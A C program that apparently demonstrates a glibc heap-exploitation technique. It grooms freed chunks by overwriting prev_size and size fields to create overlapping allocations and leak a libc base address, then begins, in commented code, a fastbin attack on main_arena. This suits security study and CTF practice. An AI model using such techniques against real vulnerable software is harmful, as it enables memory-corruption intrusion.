#include <stdio.h>
#include <stdlib.h>

int main()
{
	void *p1,*p2,*p3,*p4,*p5;
	void *p6,*p7,*p8,*p9,*p10;
	void *p11,*p12,*p13,*p14;
	long long *ptr;
	long long *out_ptr;

	p1=malloc(0x20);
	p2=malloc(0x60);
	p3=malloc(0x60);
	p4=malloc(0x60);
	p5=malloc(0x60);
	p6=malloc(0x60);
	p7=malloc(0x60);
	p8=malloc(0x60);
	p9=malloc(0x60);
	p10=malloc(0x60);
	p11=malloc(0x60);
	p12=malloc(0x60);
	p13=malloc(0x60);
	p14=malloc(0x60);
	printf("playground at %llx to %llx\n\n",(long long)p1,(long long)p14+0x60);

	malloc(0x20);

	free(p1);
	free(p4);
	free(p5);
	free(p6);
	free(p7);
	free(p8);
	free(p9);

	malloc(0x500);
	
	out_ptr=(long long*)p10-2;
	printf("at first, p10 pre_size:%llx\n",*out_ptr);

	p4=malloc(0x60); // 1
	ptr=(long long)p4+0x60;
	*ptr=0x180;
	*(ptr+1)=0x1c0;
	printf("shrink the unsorted bin\n");
	printf("first alloc, p10 pre_size:%llx\n",*out_ptr);

	p5=malloc(0x60); // 4

	p7=malloc(0x60);

	ptr=(long long)p5+0x60;
	*ptr=0x70;
	printf("twice alloc, p10 pre_size:%llx\n",*out_ptr);

	p6=malloc(0x60); // 5
	free(p5);
	printf("thrice alloc, p10 pre_size:%llx\n",*out_ptr);

	malloc(0x500);
	free(p10);
	malloc(0x500);

	printf("now we had just merged the chunks\n");
	printf("we have chunks in \np4:%llx to %llx\n",(long long)p4,(long long)p4+0x60);
	printf("p6:%llx to %llx\n",(long long)p6,(long long)p6+0x60);
	printf("so we can leak lib address by show p4:%llx\n\n",*(long long*)p4);
	long long libc_base=*(long long*)p4;
	libc_base-=0x3c4e08;

	printf("triger\n");

	// heap exploit:
	malloc(0x60); // 4
	malloc(0x60); // 6
	malloc(0x60); // 7
	p5=malloc(0x60); // 8
	printf("p5(from %p) will be overlapped with p6(from %p)\n",p5,p6);

	/*
	printf("then we free the p5 and edit its fd, put 0x60 in the main_arena\n\n");

	free(p5);
	ptr=(long long*)p6;
	*ptr=0x60;

	// 0x60 in the main_arena now
	malloc(0x60); // 9
	printf("0x60 in the main_arena now\n");
	printf("and we can bypass size check with address:%llx\n\n",libc_base+0x3c4b48);
	*/




	return 0;
}
